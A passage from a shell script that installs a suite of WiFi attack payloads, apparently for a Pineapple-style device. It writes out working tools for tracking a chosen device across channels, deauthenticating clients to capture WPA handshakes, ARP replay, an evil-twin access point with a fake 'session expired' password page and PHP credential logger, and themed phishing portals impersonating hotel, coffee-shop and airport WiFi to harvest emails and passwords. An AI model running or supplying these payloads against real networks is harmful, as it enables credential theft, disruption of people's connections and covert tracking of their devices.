        echo "  Client: $mac" >> "$MAP_FILE"
        [ "$bssid" != "(notassociated)" ] && [ -n "$bssid" ] && echo "    Connected to: $bssid" >> "$MAP_FILE"
        [ -n "$probes" ] && echo "    Probing: $probes" >> "$MAP_FILE"
    done < /tmp/socialmap-01.csv
fi

rm -f /tmp/socialmap* 2>/dev/null

PROMPT "SOCIAL MAP COMPLETE

APs found: $AP_COUNT
Clients: $CLIENT_COUNT
Map: $MAP_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 18. WaveRider - Was headless infinite loop, now Pager API with duration
##############################################################################
cat > "$SUITE_DIR/WaveRider/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: WaveRider - Channel-hopping Pursuit
# Author: NullSec
# Description: Track a device across channels
# Category: nullsec/tracking

LOOT_DIR="/mmc/nullsec/waverider"
mkdir -p "$LOOT_DIR"

PROMPT "WAVERIDER - TARGET PURSUIT

Track a specific device
across WiFi channels.

Hops channels to follow
target and capture traffic.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

TARGET_MAC=$(MAC_PICKER "Target MAC address:")
[ -z "$TARGET_MAC" ] && { ERROR_DIALOG "No MAC entered!"; exit 1; }

DURATION=$(NUMBER_PICKER "Track duration (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

resp=$(CONFIRMATION_DIALOG "START TRACKING?

Target: $TARGET_MAC
Duration: ${DURATION}s
Interface: $MON_IF

Will hop channels to find
and capture target traffic.

Press OK to pursue.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Pursuing $TARGET_MAC..."
LOG_FILE="$LOOT_DIR/track_$(date +%Y%m%d_%H%M).log"

END_TIME=$(($(date +%s) + DURATION))
FOUND_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    for ch in 1 6 11 2 3 4 5 7 8 9 10; do
        [ $(date +%s) -ge $END_TIME ] && break
        iwconfig "$MON_IF" channel $ch 2>/dev/null
        if timeout 2 tcpdump -i "$MON_IF" -c 5 -q 2>/dev/null | grep -qi "$TARGET_MAC"; then
            LOG "Target on channel $ch!"
            echo "$(date +%H:%M:%S) Found on CH:$ch" >> "$LOG_FILE"
            FOUND_COUNT=$((FOUND_COUNT + 1))
            timeout 15 tcpdump -i "$MON_IF" ether host "$TARGET_MAC" -w "$LOOT_DIR/cap_ch${ch}_$(date +%s).pcap" 2>/dev/null
        fi
    done
done

PROMPT "WAVERIDER COMPLETE

Target: $TARGET_MAC
Duration: ${DURATION}s
Times found: $FOUND_COUNT
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 19. ZeroClick - Was headless no-input, now Pager API
##############################################################################
cat > "$SUITE_DIR/ZeroClick/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: ZeroClick - Automated Attack Chain
# Author: NullSec
# Description: Automated scan, identify, and capture
# Category: nullsec/auto

LOOT_DIR="/mmc/nullsec/zeroclick"
mkdir -p "$LOOT_DIR"

PROMPT "ZEROCLICK AUTO-ATTACK

Automated attack chain:
1. Scan all networks
2. Identify weak targets
3. Capture handshakes

Requires confirmation
before each stage.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

SCAN_TIME=$(NUMBER_PICKER "Scan time (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_TIME=30 ;; esac

MAX_TARGETS=$(NUMBER_PICKER "Max targets to attack:" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_TARGETS=5 ;; esac

resp=$(CONFIRMATION_DIALOG "START ZEROCLICK?

Scan time: ${SCAN_TIME}s
Max targets: $MAX_TARGETS
Interface: $MON_IF

Will scan, identify, and
capture from weak networks.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Stage 1: Scan
LOG "Stage 1: Scanning..."
SPINNER_START "Scanning all networks..."
rm -f /tmp/zeroclick*
timeout "$SCAN_TIME" airodump-ng "$MON_IF" --output-format csv -w /tmp/zeroclick 2>/dev/null &
sleep "$SCAN_TIME"
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Stage 2: Identify targets
LOG "Stage 2: Identifying targets..."
VULN_FILE="$LOOT_DIR/vulnerable_$(date +%Y%m%d_%H%M).txt"
echo "=== Vulnerable Networks ===" > "$VULN_FILE"
grep -E "OPN|WEP" /tmp/zeroclick-01.csv 2>/dev/null >> "$VULN_FILE"
OPEN_COUNT=$(grep -c "OPN\|WEP" "$VULN_FILE" 2>/dev/null || echo 0)

WPA_FILE="/tmp/zc_wpa_targets.txt"
grep -iE "WPA" /tmp/zeroclick-01.csv 2>/dev/null | head -"$MAX_TARGETS" > "$WPA_FILE"
WPA_COUNT=$(wc -l < "$WPA_FILE" 2>/dev/null || echo 0)

resp=$(CONFIRMATION_DIALOG "SCAN RESULTS:

Open/WEP: $OPEN_COUNT
WPA targets: $WPA_COUNT

Capture handshakes from
WPA networks?

Press OK to continue.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f /tmp/zeroclick*; exit 0; }

# Stage 3: Capture handshakes
LOG "Stage 3: Capturing handshakes..."
HS_COUNT=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 x7 x8 x9 x10 x11 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ -z "$channel" ] && continue

    LOG "Attacking $bssid CH:$channel..."
    iwconfig "$MON_IF" channel "$channel" 2>/dev/null
    CAP_FILE="$LOOT_DIR/hs_${bssid//:/}"
    airodump-ng -c "$channel" --bssid "$bssid" -w "$CAP_FILE" "$MON_IF" 2>/dev/null &
    sleep 5
    aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
    sleep 20
    aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
    sleep 10
    killall airodump-ng aireplay-ng 2>/dev/null

    if [ -f "${CAP_FILE}-01.cap" ] && aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
        HS_COUNT=$((HS_COUNT + 1))
        LOG "Handshake captured!"
    fi
done < "$WPA_FILE"

rm -f /tmp/zeroclick* "$WPA_FILE" 2>/dev/null

PROMPT "ZEROCLICK COMPLETE

Open/WEP found: $OPEN_COUNT
WPA targets: $WPA_COUNT
Handshakes captured: $HS_COUNT

Results: $LOOT_DIR/

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 20. TimeBomb - Was CLI args, now Pager API
##############################################################################
cat > "$SUITE_DIR/TimeBomb/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: TimeBomb - Scheduled Payload Execution
# Author: NullSec
# Description: Schedule delayed payload execution
# Category: nullsec/util

TIMEBOMB_DIR="/mmc/nullsec/timebomb"
mkdir -p "$TIMEBOMB_DIR"

PROMPT "TIMEBOMB - SCHEDULER

Schedule payloads to run
after a delay.

Actions:
1. Schedule new payload
2. List scheduled
3. Clear all scheduled

Press OK to continue."

ACTION=$(NUMBER_PICKER "Action (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

SCHEDULE_FILE="$TIMEBOMB_DIR/scheduled.txt"

case $ACTION in
    2)
        # List scheduled
        if [ -f "$SCHEDULE_FILE" ] && [ -s "$SCHEDULE_FILE" ]; then
            JOBS=$(cat "$SCHEDULE_FILE")
            PROMPT "SCHEDULED PAYLOADS:

$JOBS

Press OK to exit."
        else
            PROMPT "No payloads scheduled.

Press OK to exit."
        fi
        exit 0
        ;;
    3)
        resp=$(CONFIRMATION_DIALOG "CLEAR ALL TIMEBOMBS?

Remove all scheduled
payload executions?")
        [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && {
            > "$SCHEDULE_FILE"
            [ -f "$TIMEBOMB_DIR/watcher.pid" ] && kill $(cat "$TIMEBOMB_DIR/watcher.pid") 2>/dev/null
            PROMPT "All timebombs cleared."
        }
        exit 0
        ;;
esac

# Schedule new payload
PROMPT "AVAILABLE PAYLOADS:

$(ls /root/payloads/user/nullsec/ 2>/dev/null | head -15)

Enter payload name next."

PAYLOAD_NAME=$(TEXT_PICKER "Payload name:" "DeauthStorm")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

PAYLOAD_PATH="/root/payloads/user/nullsec/$PAYLOAD_NAME/payload.sh"
[ ! -f "$PAYLOAD_PATH" ] && { ERROR_DIALOG "Payload not found: $PAYLOAD_NAME"; exit 1; }

DELAY_MIN=$(NUMBER_PICKER "Delay (minutes):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

resp=$(CONFIRMATION_DIALOG "SCHEDULE TIMEBOMB?

Payload: $PAYLOAD_NAME
Delay: ${DELAY_MIN} minutes

Press OK to schedule.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

DELAY_SEC=$((DELAY_MIN * 60))
EXEC_TIME=$(($(date +%s) + DELAY_SEC))
JOB_ID="TB_$(date +%s)"

echo "$JOB_ID | $PAYLOAD_NAME | in ${DELAY_MIN}m | pending" >> "$SCHEDULE_FILE"

LOG "TimeBomb set: $PAYLOAD_NAME in ${DELAY_MIN}m"

# Start background watcher
(
    sleep "$DELAY_SEC"
    bash "$PAYLOAD_PATH" >> "$TIMEBOMB_DIR/exec_log.txt" 2>&1
    sed -i "s/$JOB_ID.*pending/$JOB_ID | $PAYLOAD_NAME | executed/" "$SCHEDULE_FILE"
) &
echo $! > "$TIMEBOMB_DIR/watcher_${JOB_ID}.pid"

PROMPT "TIMEBOMB SET!

Payload: $PAYLOAD_NAME
Fires in: ${DELAY_MIN} minutes
Job ID: $JOB_ID

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 21. PacketReplay - Was CLI args, now Pager API
##############################################################################
cat > "$SUITE_DIR/PacketReplay/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Packet Replay
# Author: NullSec
# Description: Capture and replay WiFi packets
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/packetreplay"
mkdir -p "$LOOT_DIR"

PROMPT "PACKET REPLAY

Capture and replay WiFi
packets for:

1. Packet capture
2. Replay attack
3. ARP replay (WEP)

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "MODE:

1. Capture packets
2. Replay captured packets
3. ARP replay attack

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

TARGET_BSSID=$(MAC_PICKER "Target BSSID:")
[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "No BSSID entered!"; exit 1; }

TARGET_CH=$(NUMBER_PICKER "Channel:" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_CH=6 ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START PACKET REPLAY?

Mode: $MODE
Target: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${DURATION}s

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Packet replay mode $MODE..."
iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null

case $MODE in
    1)
        CAP_FILE="$LOOT_DIR/capture_$(date +%Y%m%d_%H%M)"
        LOG "Capturing packets..."
        timeout "$DURATION" airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
        wait $!
        PROMPT "CAPTURE COMPLETE

File: ${CAP_FILE}-01.cap
Press OK to exit."
        ;;
    2)
        LATEST_CAP=$(ls -t "$LOOT_DIR"/*.cap 2>/dev/null | head -1)
        [ -z "$LATEST_CAP" ] && { ERROR_DIALOG "No captures found!"; exit 1; }
        LOG "Replaying: $LATEST_CAP"
        timeout "$DURATION" aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
        PROMPT "REPLAY COMPLETE

Replayed: $LATEST_CAP
Press OK to exit."
        ;;
    3)
        LOG "ARP replay attack..."
        CAP_FILE="$LOOT_DIR/arp_$(date +%Y%m%d_%H%M)"
        airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
        sleep 3
        timeout "$DURATION" aireplay-ng -3 -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
        killall airodump-ng 2>/dev/null
        PROMPT "ARP REPLAY COMPLETE

Capture: ${CAP_FILE}-01.cap
Press OK to exit."
        ;;
esac
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 22. EvilTwin - Fix interface collision (use wlan1mon for scan, wlan1 for AP)
##############################################################################
cat > "$SUITE_DIR/EvilTwin/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Evil Twin
# Author: bad-antics
# Description: Clone a target network and capture credentials
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/eviltwin"
mkdir -p "$LOOT_DIR"

PROMPT "EVIL TWIN ATTACK

Clone a legitimate network
and capture credentials.

1. Scans for target
2. Creates identical AP
3. Optional client deauth
4. Captures login attempts

Press OK to configure."

# Use monitor interface for scanning
MON_IF=""
for iface in wlan1mon wlan2mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

SPINNER_START "Scanning networks..."
rm -f /tmp/twinscan*
timeout 12 airodump-ng "$MON_IF" -w /tmp/twinscan --output-format csv 2>/dev/null &
sleep 12
killall airodump-ng 2>/dev/null
SPINNER_STOP

NET_COUNT=0
NETS=""
if [ -f /tmp/twinscan-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"
        NET_COUNT=$((NET_COUNT + 1))
        NETS="${NETS}${NET_COUNT}. ${essid}\n"
        eval "BSSID_${NET_COUNT}=\"$bssid\""
        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
        eval "ESSID_${NET_COUNT}=\"$essid\""
        [ $NET_COUNT -ge 10 ] && break
    done < /tmp/twinscan-01.csv
fi

[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

PROMPT "TARGETS: $NET_COUNT

$(echo -e "$NETS")
Select target to clone."

TARGET_NUM=$(NUMBER_PICKER "Clone target #:" 1)
eval "REAL_BSSID=\"\$BSSID_${TARGET_NUM}\""
eval "REAL_CHANNEL=\"\$CH_${TARGET_NUM}\""
eval "TARGET_SSID=\"\$ESSID_${TARGET_NUM}\""

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

DEAUTH_REAL=$(CONFIRMATION_DIALOG "Deauth real AP?

Force clients to reconnect
to your evil twin?

Uses separate monitor iface.")

resp=$(CONFIRMATION_DIALOG "LAUNCH EVIL TWIN?

Clone: $TARGET_SSID
BSSID: $REAL_BSSID
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

CRED_LOG="$LOOT_DIR/twin_$(date +%Y%m%d_%H%M).txt"
echo "Evil Twin Credentials - $(date)" > "$CRED_LOG"

killall hostapd dnsmasq php aireplay-ng 2>/dev/null

# Use wlan1 for AP (stop monitor first)
AP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

cat > /tmp/twin_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$REAL_CHANNEL
auth_algs=1
wpa=0
EOF

mkdir -p /tmp/twin_portal
cat > /tmp/twin_portal/index.html << TWINHTML
<!DOCTYPE html>
<html><head><title>$TARGET_SSID - Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px}.c{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}h1{color:#333;text-align:center}.w{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:15px 0;border-radius:4px;font-size:13px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}button{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:4px;font-size:16px}</style>
</head><body><div class="c"><h1>$TARGET_SSID</h1>
<div class="w">Session expired. Re-enter WiFi password.</div>
<form method="POST" action="/capture.php">
<input type="password" name="password" placeholder="WiFi Password" required>
<input type="hidden" name="ssid" value="$TARGET_SSID">
<button type="submit">Connect</button></form></div></body></html>
TWINHTML

cat > /tmp/twin_portal/capture.php << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ssid = \$_POST['ssid'] ?? '';
\$pass = \$_POST['password'] ?? '';
file_put_contents(\$log, "[\$ts] SSID:\$ssid IP:\$ip PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
CAPPHP

cat > /tmp/twin_portal/success.html << 'SHTML'
<!DOCTYPE html><html><head><title>Connected</title>
<style>body{font-family:Arial;text-align:center;padding:50px}.ok{color:#4caf50;font-size:60px}</style>
</head><body><div class="ok">✓</div><h1>Connected!</h1><p>Reconnecting...</p></body></html>
SHTML

LOG "Starting Evil Twin: $TARGET_SSID"

hostapd /tmp/twin_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/twin_dns.conf << EOF
interface=$AP_IF
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/twin_dns.conf 2>/dev/null

cd /tmp/twin_portal
php -S 10.0.0.1:80 2>/dev/null &

# Deauth on separate interface if requested
if [ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # Use wlan0mon for deauth (different radio)
    if [ -d "/sys/class/net/wlan0mon" ]; then
        LOG "Deauthing real AP on wlan0mon..."
        iwconfig wlan0mon channel "$REAL_CHANNEL" 2>/dev/null
        aireplay-ng -0 0 -a "$REAL_BSSID" wlan0mon 2>/dev/null &
    fi
fi

sleep "$DURATION"

killall hostapd dnsmasq php aireplay-ng 2>/dev/null
rm -rf /tmp/twin_portal /tmp/twin_*.conf

# Restart monitor mode
airmon-ng start wlan1 2>/dev/null

CRED_COUNT=$(grep -c "PASS:" "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "EVIL TWIN COMPLETE

Cloned: $TARGET_SSID
Duration: ${DURATION}s
Creds captured: $CRED_COUNT
Log: $CRED_LOG

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 23. RickRoll - Fix: embed video instead of redirect to YouTube
##############################################################################
cat > "$SUITE_DIR/RickRoll/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: NullSec RickRoll AP
# Author: bad-antics
# Description: Open AP that rickrolls everyone
# Category: nullsec/prank

PROMPT "NULLSEC RICKROLL AP

Creates open WiFi that
rickrolls every connection!

Embeds the video directly
(no internet needed).

Press OK to configure."

SSID=$(TEXT_PICKER "AP Name:" "Free_Public_WiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="Free_Public_WiFi" ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

resp=$(CONFIRMATION_DIALOG "Start RickRoll AP?

SSID: $SSID
Duration: ${DURATION}s

Everyone connecting gets
RICKROLLED!

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq 2>/dev/null

AP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

cat > /tmp/rr_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

hostapd /tmp/rr_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/rr_dns.conf << EOF
interface=$AP_IF
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/rr_dns.conf 2>/dev/null

mkdir -p /tmp/rickroll
# Self-contained rickroll page (no internet needed)
cat > /tmp/rickroll/index.html << 'RRHTML'
<!DOCTYPE html>
<html>
<head><title>Loading WiFi...</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:0}
.container{padding:20px}
h1{font-size:36px;color:#f00;text-shadow:0 0 10px #f00}
h2{color:#0f0;margin-top:30px}
.rick{font-size:24px;color:#ff0;margin:20px auto;max-width:600px;line-height:1.8}
.skull{font-size:60px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.3}
</style>
</head>
<body>
<div class="container">
<div class="skull">💀</div>
<h1>NULLSEC</h1>
<h2>You've Been RickRolled!</h2>
<div class="rick">
🎵 Never gonna give you up<br>
🎵 Never gonna let you down<br>
🎵 Never gonna run around<br>
🎵 And desert you<br>
🎵 Never gonna make you cry<br>
🎵 Never gonna say goodbye<br>
🎵 Never gonna tell a lie<br>
🎵 And hurt you<br>
</div>
<p style="color:#888;margin-top:40px">Your WiFi is belong to us</p>
<p style="color:#444;font-size:12px">NullSec Pineapple Suite // bad-antics</p>
</div>
<script>
// Rickroll audio loop (simple beep melody)
try{var a=new(window.AudioContext||window.webkitAudioContext)();
function p(f,d){var o=a.createOscillator();o.frequency.value=f;o.type='square';
var g=a.createGain();g.gain.value=0.1;o.connect(g);g.connect(a.destination);
o.start(a.currentTime);o.stop(a.currentTime+d);}
var n=[[392,.3],[440,.3],[392,.3],[329,.3],[329,.3],[440,.6],[392,.6]];
var t=0;n.forEach(function(x){setTimeout(function(){p(x[0],x[1])},t*1000);t+=x[1]+0.05;});
}catch(e){}
</script>
</body>
</html>
RRHTML

# Use uhttpd
uhttpd -p 10.0.0.1:80 -h /tmp/rickroll 2>/dev/null &

LOG "RickRoll AP active: $SSID"
sleep "$DURATION"

killall hostapd dnsmasq uhttpd 2>/dev/null
rm -rf /tmp/rickroll /tmp/rr_*.conf
airmon-ng start wlan1 2>/dev/null

PROMPT "RICKROLL COMPLETE

SSID: $SSID
Duration: ${DURATION}s

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 24. Siren - Fix GET/POST mismatch (use PHP for proper POST handling)
##############################################################################
cat > "$SUITE_DIR/Siren/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Siren - Social Infrastructure Reconnaissance
# Author: bad-antics
# Description: Advanced captive portal with multiple lures
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/siren"
PORTAL_DIR="/tmp/siren_portal"
mkdir -p "$LOOT_DIR" "$PORTAL_DIR"

PROMPT "SIREN - THE WIRELESS LURE

Advanced captive portal with
themed login pages.

Songs:
1. Hotel WiFi
2. Airport Free
3. Coffee Shop
4. Social Login
5. Corporate Guest

Press OK to configure."

PROMPT "CHOOSE YOUR SONG:

1. Hotel WiFi
2. Airport Free
3. Coffee Shop
4. Social Login
5. Corporate Guest
6. Free Premium WiFi

Select on next screen."

SONG=$(NUMBER_PICKER "Song (1-6):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SONG=1 ;; esac

case $SONG in
    1) SSID="Marriott_Guest_WiFi"; PORTAL_TYPE="hotel" ;;
    2) SSID="Airport_Free_WiFi"; PORTAL_TYPE="airport" ;;
    3) SSID="Starbucks_WiFi"; PORTAL_TYPE="coffee" ;;
    4) SSID="Free_WiFi_Social"; PORTAL_TYPE="social" ;;
    5) SSID="GUEST-NETWORK"; PORTAL_TYPE="corporate" ;;
    6) SSID="FREE_PREMIUM_WIFI"; PORTAL_TYPE="premium" ;;
esac

CUSTOM_SSID=$(TEXT_PICKER "SSID (or keep default):" "$SSID")
[ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "DEPLOY SIREN?

SSID: $SSID
Portal: $PORTAL_TYPE
Duration: ${DURATION} min

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M).txt"
echo "SIREN Credentials - $(date) - SSID: $SSID" > "$LOOT_FILE"

# Create portal based on type
case $PORTAL_TYPE in
    hotel)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Hotel Guest WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px}</style>
</head><body><div class="c"><h1>Hotel Guest WiFi</h1>
<p>Enter room details to connect</p>
<form action="/capture.php" method="POST">
<input name="room" placeholder="Room Number" required>
<input name="lastname" placeholder="Last Name" required>
<input name="email" type="email" placeholder="Email" required>
<button type="submit">Connect</button></form></div></body></html>
PHTML
        ;;
    social)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Free WiFi - Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-size:16px}.fb{background:#1877f2;color:#fff}</style>
</head><body><div class="c"><h1>Free WiFi</h1><p>Sign in to connect</p>
<form action="/capture.php" method="POST">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button class="fb" type="submit">Sign In</button></form></div></body></html>
PHTML
        ;;
    *)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Free WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px}</style>
</head><body><div class="c"><h1>Free WiFi Access</h1>
<form action="/capture.php" method="POST">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button></form></div></body></html>
PHTML
        ;;
esac

# PHP capture script (properly reads POST data)
cat > "$PORTAL_DIR/capture.php" << CAPEOF
<?php
\$log = "$LOOT_FILE";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$data = "";
foreach (\$_POST as \$k => \$v) { \$data .= "\$k=\$v "; }
file_put_contents(\$log, "[\$ts] IP:\$ip \$data\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPEOF

cat > "$PORTAL_DIR/success.html" << 'SHTML'
<!DOCTYPE html><html><head><title>Connected!</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}h1{color:#4CAF50}</style>
</head><body><h1>✓ Connected!</h1><p>You now have internet access.</p></body></html>
SHTML

